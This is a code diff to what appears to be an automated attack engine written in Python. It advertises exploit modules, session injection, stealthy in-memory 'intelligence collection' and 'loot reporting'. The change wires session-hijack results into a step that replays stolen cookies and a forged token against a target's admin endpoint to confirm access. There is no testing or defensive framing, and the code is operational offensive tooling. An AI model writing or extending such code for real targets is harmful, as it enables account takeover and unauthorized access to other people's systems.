@@ -8,7 +8,7 @@ Features:
 - Live autonomous test-account session propagation across exploit modules
 - Persistent Session Pool & Response Fingerprinter integration for false-positive elimination
 - HTTP/2 single-packet concurrency engine integration for race condition logic fuzzing
-- Live on-screen login verification and session injection feedback
+- Live on-screen login verification and session injection feedback with automatic HTML loot reporting
 - Zero-disk in-memory intelligence collection & live telemetry streaming
 """
 import asyncio
@@ -393,7 +393,16 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
         error(f"Database assault failed: {exc}")
 
     try:
-        await run_session_hijack(target_url, port=port, use_ssl=secure)
+        hijack_results = await run_session_hijack(target_url, port=port, use_ssl=secure)
+        if hijack_results:
+            for finding in hijack_results:
+                if finding.get("status") == "VERIFIED_ACCESS":
+                    execute_live_login_verification(
+                        target_url=target_url,
+                        endpoint=finding.get("endpoint", "/admin"),
+                        cookie_dict=dict(transport.cookie_jar) if transport.cookie_jar else None,
+                        token=finding.get("forged_token")
+                    )
     except Exception as exc:
         error(f"Session hijack failed: {exc}")
 
